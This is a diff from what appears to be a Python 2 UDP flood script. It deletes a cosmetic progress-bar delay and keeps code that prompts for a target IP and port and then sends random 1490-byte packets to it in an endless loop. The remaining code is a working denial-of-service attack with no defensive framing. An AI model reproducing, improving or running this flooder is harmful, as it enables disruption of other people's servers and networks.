@@ -21,16 +21,6 @@ bytes = random._urandom(1490)
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
 
-print "[                    ] 0% "
-time.sleep(5)
-print "[====                ] 15%"
-time.sleep(5)
-print "[=========           ] 45%"
-time.sleep(5)
-print "[===============     ] 75%"
-time.sleep(5)
-print "[====================] 100%"
-time.sleep(3)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
